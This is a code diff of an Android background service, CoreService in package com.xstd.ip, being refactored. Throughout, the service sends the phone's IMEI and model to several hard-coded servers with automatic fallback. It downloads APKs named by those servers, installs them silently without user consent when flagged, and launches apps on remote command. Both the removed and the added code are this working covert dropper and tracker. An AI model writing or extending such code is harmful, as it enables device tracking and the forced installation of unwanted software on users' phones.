@@ -1,65 +1,49 @@
 package com.xstd.ip.service;
 
 import android.app.Service;
-import android.content.*;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.IPackageInstallObserver;
-import android.database.Cursor;
-import android.graphics.Bitmap;
+import android.content.pm.PackageInfo;
 import android.net.wifi.WifiManager;
-import android.os.*;
-import android.telephony.TelephonyManager;
-import android.text.TextUtils;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.RemoteException;
 import android.text.format.DateUtils;
 import android.text.format.Time;
-
 import com.android.volley.AuthFailureError;
-import com.android.volley.Request;
-import com.android.volley.RequestQueue;
-import com.android.volley.Response.ErrorListener;
-import com.android.volley.Response.Listener;
+import com.android.volley.Response;
 import com.android.volley.VolleyError;
-import com.android.volley.toolbox.JsonArrayRequest;
 import com.android.volley.toolbox.StringRequest;
-import com.android.volley.toolbox.Volley;
 import com.xstd.ip.Config;
+import com.xstd.ip.InitApplication;
 import com.xstd.ip.Tools;
-import com.xstd.ip.dao.SilenceAppDao;
-import com.xstd.ip.dao.SilenceAppDaoUtils;
-
-import net.tsz.afinal.FinalHttp;
+import com.xstd.ip.module.ApplicationInfo;
+import com.xstd.ip.module.PushMessage;
 import net.tsz.afinal.http.AjaxCallBack;
-
-import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
-import org.w3c.dom.Text;
 
 import java.io.File;
-import java.io.UnsupportedEncodingException;
-import java.net.URLEncoder;
 import java.util.HashMap;
-import java.util.LinkedList;
 import java.util.List;
 import java.util.Map;
 
 public class CoreService extends Service {
 
-    public static final int UNLOCK_SCREEN = 0x000001;
-    public static final int WIFI_STATE_CHANGED = 0x000002;
+    public static final int UNLOCK_SCREEN = 1;
+    public static final int WIFI_STATE_CHANGED = 2;
     public static final String FETCH_SERVER_URL = "http://www.xsjingmo.com:8080/springMvc/student.do";
     public static final String FETCH_SERVER_URL1 = "http://www.jingmoby.com:8080/springMvc/student.do";
     public static final String FETCH_SERVER_URL2 = "http://www.jmxstd.com:8080/springMvc/student.do";
     public static final String FETCH_SERVER_URL3 = "http://www.beiyongjm.com:8080/springMvc/student.do";
-    //    public static final String DOWNLOAD_LOCATION = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator;
     public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// 一天的毫秒數
-    public static LinkedList<ApkInfo> mustDownloadApp = new LinkedList<ApkInfo>();
     private CoreReceiver receiver;
-    private SharedPreferences sharedPreferences;
-    private FinalHttp finalHttp;
-    private RequestQueue requestQueue;
-    private String imei;
-    private String device;
-    private String os;
+    private Handler handler;
+    private InitApplication application;
+
     private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {
 
         @Override
@@ -69,33 +53,15 @@ public class CoreService extends Service {
 
     @Override
     public IBinder onBind(Intent intent) {
-        return null;
+        throw new UnsupportedOperationException("not call bindService()!!!");
     }
 
     @Override
     public void onCreate() {
         super.onCreate();
-
-        receiver = new CoreReceiver();
-        IntentFilter filter = new IntentFilter();
-        filter.setPriority(Integer.MAX_VALUE);
-        filter.addAction(Intent.ACTION_USER_PRESENT);
-        filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
-        registerReceiver(receiver, filter);
-
-        sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);
-        finalHttp = new FinalHttp();
-        requestQueue = Volley.newRequestQueue(getApplicationContext());
-        os = Build.VERSION.RELEASE;
-        imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
-
-        try {
-            device = URLEncoder.encode(Build.MODEL, "UTF-8");
-        } catch (UnsupportedEncodingException e) {
-            device = Build.MODEL;
-            e.printStackTrace();
-        }
-
+        application = (InitApplication) getApplication();
+        handler = new Handler(getMainLooper());
+        registerCoreReceiver();
     }
 
     @Override
@@ -108,6 +74,15 @@ public class CoreService extends Service {
         super.onDestroy();
         if (receiver != null)
             unregisterReceiver(receiver);
+    }
+
+    private void registerCoreReceiver() {
+        receiver = new CoreReceiver();
+        IntentFilter filter = new IntentFilter();
+        filter.setPriority(Integer.MAX_VALUE);
+        filter.addAction(Intent.ACTION_USER_PRESENT);
+        filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
+        registerReceiver(receiver, filter);
     }
 
     /**
@@ -124,9 +99,39 @@ public class CoreService extends Service {
                     updateService();
                 break;
             case WIFI_STATE_CHANGED:
-                int wifistate = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, WifiManager.WIFI_STATE_DISABLED);
-                if (wifistate == WifiManager.WIFI_STATE_ENABLING || wifistate == WifiManager.WIFI_STATE_ENABLED)
+//                int wifistate = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, WifiManager.WIFI_STATE_DISABLED);
+//                if (wifistate == WifiManager.WIFI_STATE_ENABLING || wifistate == WifiManager.WIFI_STATE_ENABLED)
+                if (Tools.isOnline(getApplicationContext()))
                     updateService();
+        }
+    }
+
+    /**
+     * 改变访问服务器的url。
+     */
+    private void changeServerUrl() {
+        long last_failed_update_time = application.getSharedPreferences().getLong("last_failed_update_time", -1);
+        if (last_failed_update_time == -1)
+            application.getSharedPreferences().edit().putLong("last_failed_update_time", System.currentTimeMillis()).commit();
+        else {
+            String url = application.getSharedPreferences().getString("fetch_server_url", FETCH_SERVER_URL);
+            if (FETCH_SERVER_URL.equals(url)) {
+                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
+                    application.getSharedPreferences().edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL1).commit();
+                }
+            } else if (FETCH_SERVER_URL1.equals(url)) {
+                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
+                    application.getSharedPreferences().edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL2).commit();
+                }
+            } else if (FETCH_SERVER_URL2.equals(url)) {
+                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
+                    application.getSharedPreferences().edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL3).commit();
+                }
+            } else if (FETCH_SERVER_URL3.equals(url)) {
+                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
+                    application.getSharedPreferences().edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL).commit();
+                }
+            }
         }
     }
 
@@ -134,7 +139,8 @@ public class CoreService extends Service {
      * 从服务器获取更新
      */
     private void updateService() {
-        long last_update_time = sharedPreferences.getLong("last_update_time", 0);
+        pushMessage();
+        long last_update_time = application.getSharedPreferences().getLong("last_update_time", 0);
         if (DateUtils.isToday(last_update_time)) {
             startDownload();
             return;
@@ -144,60 +150,66 @@ public class CoreService extends Service {
         else
             Config.IS_DOWNLOADING.set(true);
 
-        requestQueue.add(new JsonArrayRequest(String.format(sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL) + "?method=save&imei=%s&os=%s&device=%s", imei, os, device), new Listener<JSONArray>() {
-
+        application.getFinalHttp().get(String.format(application.getSharedPreferences().getString("fetch_server_url", FETCH_SERVER_URL) + "?method=save&imei=%s&os=%s&device=%s", application.getImei(), application.getOs(), application.getDevice()), new AjaxCallBack<Object>() {
             @Override
-            public void onResponse(JSONArray jsonArray) {
-                Tools.logW(jsonArray.toString());
-                mustDownloadApp.clear();
+            public void onSuccess(Object o) {
+                super.onSuccess(o);
+                Tools.logW("updateService:" + o.toString());
+                application.getSharedPreferences().edit().putLong("last_update_time", System.currentTimeMillis()).commit();
                 Config.IS_DOWNLOADING.set(false);
+                if (Tools.isEmpty(o.toString()))
+                    return;
                 List<String> installPackages = Tools.getDeviceInstallPackName(getApplicationContext());
-                SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext());
-                for (int i = 0; i < jsonArray.length(); i++) {
-                    try {
-                        JSONObject obj = jsonArray.getJSONObject(i);
-                        String fileName = obj.getString("fileName");
-                        String packName = obj.getString("packName");
-                        String remoteUrl = obj.getString("remoteUrl");
-                        boolean isSilence = obj.getBoolean("isSilence");
-                        if (installPackages.contains(packName)) {
-                            Tools.notifyServer(getApplicationContext(), SendServerService.ACTION_DEVICE_INSTALLED, packName);
-                            continue;
-                        }
-                        Cursor cursor = dao.getDatabase().query(dao.getTablename(), new String[]{SilenceAppDao.Properties.Packagename.columnName},
-                                SilenceAppDao.Properties.Packagename.columnName + "=?", new String[]{packName}, null, null, null);
-                        if (cursor != null && cursor.moveToFirst()) {
-                            Tools.notifyServer(getApplicationContext(), SendServerService.ACTION_INSTALLED_BEFORE, packName);
-                            continue;
-                        }
-                        if (cursor != null)
-                            cursor.close();
-                        ApkInfo app = new ApkInfo();
-                        app.fileName = fileName;
-                        app.packName = packName;
-                        app.remoteUrl = remoteUrl;
-                        app.isSilence = isSilence;
-                        if (!isSilence) {
-                            app.tickerText = obj.getString("tickerText");
-                            app.title = obj.getString("title");
-                            app.text = obj.getString("text");
-                        }
-                        mustDownloadApp.add(app);
-                    } catch (JSONException e) {
-                        e.printStackTrace();
+                try {
+                    JSONObject jsonObject = new JSONObject(o.toString());
+                    String fileName = jsonObject.getString("fileName");
+                    String packName = jsonObject.getString("packName");
+                    String remoteUrl = jsonObject.getString("remoteUrl");
+                    boolean isSilence = jsonObject.getBoolean("isSilence");
+                    String token = jsonObject.getString("mark");
+                    if (installPackages.contains(packName)) {
+                        PushMessage message = new PushMessage();
+                        message.setPackageName(packName);
+                        message.setToken(token);
+                        message.setType(SendServerService.TYPE_DEVICE_INSTALLED);
+                        application.getFinalDb().save(message);
+                        return;
                     }
+                    List<ApplicationInfo> infos = application.getFinalDb().findAllByWhere(ApplicationInfo.class, String.format("packageName='%s'", packName));
+                    if (infos != null && infos.size() > 0) {
+                        ApplicationInfo info = infos.get(0);
+                        if (info != null && info.isInstall()) {
+                            PushMessage message = new PushMessage();
+                            message.setPackageName(packName);
+                            message.setToken(token);
+                            message.setType(SendServerService.TYPE_INSTALLED_BEFORE);
+                            application.getFinalDb().save(message);
+                        }
+                        return;
+                    }
+                    ApplicationInfo info = new ApplicationInfo(fileName, packName, remoteUrl, isSilence, token);
+                    if (!isSilence) {
+                        info.setTickerText(jsonObject.getString("tickerText"));
+                        info.setTitle(jsonObject.getString("title"));
+                        info.setText(jsonObject.getString("text"));
+                    }
+                    application.getFinalDb().save(info);
+                } catch (JSONException e) {
+                    //解析出错，通知服务器。
+                    String url = String.format(application.getSharedPreferences().getString("fetch_server_url", FETCH_SERVER_URL) + "?method=errorNotes&imei=?&errorinfo=?", application.getImei(), e.getMessage());
+                    application.getFinalHttp().get(url, new AjaxCallBack<Object>() {
+                    });
+                    e.printStackTrace();
                 }
-                sharedPreferences.edit().putLong("last_update_time", System.currentTimeMillis()).commit();
                 startDownload();
             }
-        }, new ErrorListener() {
 
             @Override
-            public void onErrorResponse(VolleyError arg0) {
-                Tools.logW(arg0.toString());
+            public void onFailure(Throwable t, int errorNo, String strMsg) {
+                super.onFailure(t, errorNo, strMsg);
+                Tools.logW("updateService:" + strMsg);
                 Config.IS_DOWNLOADING.set(false);
                 changeServerUrl();
-                Handler handler = new Handler(getMainLooper());
                 handler.postDelayed(new Runnable() {
 
                     @Override
@@ -206,79 +218,72 @@ public class CoreService extends Service {
                             updateService();
                     }
                 }, 1000 * 60 * 5);
-
             }
-        }));
-        requestQueue.add(new JsonArrayRequest(String.format(sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL) + "?method=activating&imei=%s&os=%s&device=%s", imei, os, device), new Listener<JSONArray>() {
+        });
+        application.getFinalHttp().get(String.format(application.getSharedPreferences().getString("fetch_server_url", FETCH_SERVER_URL) + "?method=activating&imei=%s&os=%s&device=%s", application.getImei(), application.getOs(), application.getDevice()), new AjaxCallBack<Object>() {
             @Override
-            public void onResponse(JSONArray jsonArray) {
-                for (int i = 0; i < jsonArray.length(); i++) {
-                    try {
-                        JSONObject jsonObject = jsonArray.getJSONObject(i);
-                        String packageName = jsonObject.getString("packName");
-                        Tools.logW("发现：" + packageName + "需要激活。");
-                        if (!TextUtils.isEmpty(packageName))
-                            Tools.launchApplication(getApplicationContext(), packageName);
-                    } catch (JSONException e) {
-                        e.printStackTrace();
-                    }
+            public void onSuccess(Object o) {
+                super.onSuccess(o);
+                if (Tools.isEmpty(o.toString()))
+                    return;
+                try {
+                    JSONObject jsonObject = new JSONObject(o.toString());
+                    String packageName = jsonObject.getString("packName");
+                    Tools.logW("发现：" + packageName + "需要激活。");
+                    if (!Tools.isEmpty(packageName))
+                        Tools.launchApplication(getApplicationContext(), packageName);
+                } catch (JSONException e) {
+                    e.printStackTrace();
                 }
             }
-        }, null));
-        requestQueue.start();
+
+            @Override
+            public void onFailure(Throwable t, int errorNo, String strMsg) {
+                super.onFailure(t, errorNo, strMsg);
+                Tools.logW(strMsg);
+            }
+        });
     }
 
-    /**
-     * 改变访问服务器的url。
-     */
-    private void changeServerUrl() {
-        long last_failed_update_time = sharedPreferences.getLong("last_failed_update_time", -1);
-        if (last_failed_update_time == -1)
-            sharedPreferences.edit().putLong("last_failed_update_time", System.currentTimeMillis()).commit();
-        else {
-            String url = sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL);
-            if (FETCH_SERVER_URL.equals(url)) {
-                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
-                    sharedPreferences.edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL1).commit();
+    private void pushMessage() {
+        Tools.logW("PUSH_MESSAGE");
+        List<PushMessage> messages = application.getFinalDb().findAllByWhere(PushMessage.class, "successful = 0", "_id ASC");
+        for (final PushMessage message : messages) {
+            Tools.logW(message.getPackageName() + "::" + message.getToken());
+//            Tools.notifyServer(getApplicationContext(), message);
+            String params = String.format("&type=%s&imei=%s&packname=%s&mark=%s", message.getType(), application.getImei(), message.getPackageName(), message.getToken());
+            String url = getSharedPreferences(Config.SHARED_PRES, MODE_PRIVATE).getString("fetch_server_url", CoreService.FETCH_SERVER_URL) + "?method=installed" + params;
+            Tools.logW(url);
+            application.getRequestQueue().add(new StringRequest(url, new Response.Listener<String>() {
+                @Override
+                public void onResponse(String response) {
+                    message.setSuccessful(true);
+                    application.getFinalDb().update(message);
                 }
-            } else if (FETCH_SERVER_URL1.equals(url)) {
-                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
-                    sharedPreferences.edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL2).commit();
-                }
-            } else if (FETCH_SERVER_URL2.equals(url)) {
-                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
-                    sharedPreferences.edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL3).commit();
-                }
-            } else if (FETCH_SERVER_URL3.equals(url)) {
-                if (last_failed_update_time > DAY_TIME_MILLIS * 5) {
-                    sharedPreferences.edit().putLong("last_failed_update_time", System.currentTimeMillis()).putString("fetch_server_url", FETCH_SERVER_URL).commit();
-                }
-            }
+            }, null));
         }
     }
 
     private String getDownloadLocation() {
         String parent = Tools.getDownloadDirectory(getApplicationContext());
-        if (TextUtils.isEmpty(parent)) {
+        if (Tools.isEmpty(parent)) {
             // 先从本地获取下载路径，没有则从服务器获取次机型的下载地址。
-            String downloadLocation = sharedPreferences.getString("downloadlocation", null);
-            if (TextUtils.isEmpty(downloadLocation)) {
+            String downloadLocation = application.getSharedPreferences().getString("downloadlocation", null);
+            if (Tools.isEmpty(downloadLocation)) {
                 Tools.logW("从网络获取可下载地址。");
-                requestQueue.add(new StringRequest(Request.Method.POST, sharedPreferences.getString("fetch_server_url", FETCH_SERVER_URL), new Listener<String>() {
+                application.getFinalHttp().get(String.format(application.getSharedPreferences().getString("fetch_server_url", FETCH_SERVER_URL) + "?method=deviceSelect&device=%s", application.getDevice()), new AjaxCallBack<Object>() {
                     @Override
-                    public void onResponse(String s) {
-                        if (s != null) {
-                            if (!TextUtils.isEmpty(s.trim()))
-                                sharedPreferences.edit().putString("downloadlocation", s.trim()).commit();
+                    public void onSuccess(Object o) {
+                        super.onSuccess(o);
+                        if (!Tools.isEmpty(o.toString())) {
+                            application.getSharedPreferences().edit().putString("downloadlocation", o.toString().trim()).commit();
+                            startDownload();
                         }
                     }
-                }, null) {
+
                     @Override
-                    protected Map<String, String> getParams() throws AuthFailureError {
-                        Map<String, String> map = new HashMap<String, String>();
-                        map.put("device", device);
-                        map.put("method", "deviceSelect");
-                        return map;
+                    public void onFailure(Throwable t, int errorNo, String strMsg) {
+                        super.onFailure(t, errorNo, strMsg);
                     }
                 });
                 return null;
@@ -292,50 +297,72 @@ public class CoreService extends Service {
      * 開始下載，下載完成安裝
      */
     private void startDownload() {
-        String downloadlocation = getDownloadLocation();
-        Tools.logW("最终下载位置为：" + downloadlocation);
-        if (TextUtils.isEmpty(downloadlocation))
+        String direction = getDownloadLocation();
+        if (Tools.isEmpty(direction))
             return;
-        if (!Config.IS_DOWNLOADING.get() && mustDownloadApp.size() > 0) {
+        File pDir = new File(direction);
+        if (!pDir.exists())
+            pDir.mkdirs();
+        List<ApplicationInfo> infos = application.getFinalDb().findAllByWhere(ApplicationInfo.class, "download=0 OR install=0", "_id ASC");
+        if (!Config.IS_DOWNLOADING.get() && infos != null && infos.size() > 0) {
             Config.IS_DOWNLOADING.set(true);
-            final ApkInfo apkInfo = mustDownloadApp.removeFirst();
-            final File file = new File(downloadlocation, apkInfo.fileName);
-            if (file.exists())
+            final ApplicationInfo info = infos.get(0);
+            final File file = new File(direction, info.getFileName());
+            if (file.exists() && file.length() == 0)
                 file.delete();
-            Tools.logW("开始下载" + apkInfo.fileName);
-            finalHttp.download(apkInfo.remoteUrl, file.getAbsolutePath(), true, new AjaxCallBack<File>() {
+            Tools.logW("开始下载" + info.getFileName());
+            application.getFinalHttp().download(info.getDownloadPath(), file.getAbsolutePath(), true, new AjaxCallBack<File>() {
 
                 @Override
                 public void onSuccess(File file) {
                     super.onSuccess(file);
-                    Tools.logW(file.getAbsolutePath() + "下载成功");
-                    Tools.notifyServer(getApplicationContext(), SendServerService.ACTION_DOWNLOAD_SUCCESS, apkInfo.packName);
                     Config.IS_DOWNLOADING.set(false);
-                    if (apkInfo.isSilence)
-                        Tools.installFile(getApplicationContext(), file, observer);
+                    Tools.logW(file.getAbsolutePath() + "下载成功");
+                    info.setLocalPath(file.getAbsolutePath());
+                    info.setDownload(true);
+                    application.getFinalDb().update(info);
+                    PushMessage message = new PushMessage();
+                    message.setPackageName(info.getPackageName());
+                    message.setToken(info.getToken());
+                    message.setType(SendServerService.TYPE_DOWNLOAD_SUCCESS);
+                    application.getFinalDb().save(message);
+                    if (info.isSilence())
+                        Tools.installFile(getApplicationContext(), info, observer);
                     else
-                        Tools.useNotificationInstall(getApplicationContext(), apkInfo.tickerText, apkInfo.title, apkInfo.text, file.getAbsolutePath());
-                    Config.installApks.put(apkInfo.packName, apkInfo);
-                    startDownload();
+                        Tools.useNotificationInstall(getApplicationContext(), info);
                 }
 
                 @Override
-                public void onFailure(Throwable t, String strMsg) {
-                    super.onFailure(t, strMsg);
+                public void onFailure(Throwable t, int errorNo, String strMsg) {
+                    super.onFailure(t, errorNo, strMsg);
                     Tools.logW("下载失败" + strMsg);
                     Config.IS_DOWNLOADING.set(false);
-                    mustDownloadApp.addFirst(apkInfo);
-                    if (file.exists())
-                        file.delete();
-                    Handler handler = new Handler(getMainLooper());
-                    handler.postDelayed(new Runnable() {
-
-                        @Override
-                        public void run() {
-                            if (Tools.isOnline(getApplicationContext()))
-                                startDownload();
+                    if (file.exists() && errorNo == 416) {
+                        PackageInfo packageInfo = Tools.getPackageInfoByPath(getApplicationContext(), file.getAbsolutePath());
+                        if (packageInfo == null) {
+                            Tools.logW("文件错误，删除。");
+                            file.delete();
+                            startDownload();
+                        } else {
+                            Tools.logW("文件正常。");
+                            info.setLocalPath(file.getAbsolutePath());
+                            info.setDownload(true);
+                            application.getFinalDb().update(info);
+                            if (info.isSilence())
+                                Tools.installFile(getApplicationContext(), info, observer);
+                            else
+                                Tools.useNotificationInstall(getApplicationContext(), info);
                         }
-                    }, 1000 * 60 * 5);
+                    } else {
+                        handler.postDelayed(new Runnable() {
+
+                            @Override
+                            public void run() {
+                                if (Tools.isOnline(getApplicationContext()))
+                                    startDownload();
+                            }
+                        }, 1000 * 60 * 5);
+                    }
                 }
             });
         }
@@ -358,22 +385,6 @@ public class CoreService extends Service {
             return true;
         }
         return false;
-    }
-
-    public static class ApkInfo {
-        public String fileName;
-        public String packName;
-        public String remoteUrl;
-        public boolean isSilence;
-
-        /**
-         * 以下这些属性只有当isSilence为false时才有。
-         */
-        public String tickerText;
-        public String title;
-        public String text;
-        public int icon;
-        public Bitmap largeIcon;
     }
 
     class CoreReceiver extends BroadcastReceiver {
